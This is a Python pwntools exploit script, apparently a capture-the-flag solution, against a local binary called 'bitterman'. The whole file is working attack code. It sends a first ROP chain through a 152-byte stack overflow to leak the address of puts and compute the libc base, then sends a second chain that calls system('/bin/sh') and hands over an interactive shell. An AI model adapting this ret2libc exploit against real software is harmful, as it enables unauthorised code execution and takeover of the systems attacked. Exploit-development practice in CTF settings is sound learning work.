#!/usr/bin/python2
#Author: Wh04m1 (@filip_dragovic)
from pwn import *

context(os='linux', arch='amd64')
#context.log_level = "DEBUG"
elf = ELF('./bitterman')
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

rop.call(elf.sym.puts, [elf.got.puts])
rop.call(elf.sym.main)
log.info(rop.dump())
p = process('./bitterman')
p.recvuntil('name?')
p.sendline("Wh04m1")
p.recvuntil('message:')
p.sendline('1024')
p.recvuntil('text:')
p.sendline(fit({152:rop.chain()}))
p.recvuntil("Thanks!")
leaked_puts = p.recv()[:8].strip().ljust(8, '\x00')
libc.address = u64(leaked_puts) - libc.sym.puts
log.success("puts will be @" + hex(u64(leaked_puts)))
log.success("libc address will be @" + hex(libc.address))
rop2 = ROP(libc)
rop2.system(next(libc.search("/bin/sh\x00")))
log.info(rop2.dump())
p.sendline("Wh04m1")
p.recvuntil('message:')
p.sendline('1024')
p.recvuntil('text:')
p.sendline(fit({152:rop2.chain()}))
p.recvlines(2)
p.interactive()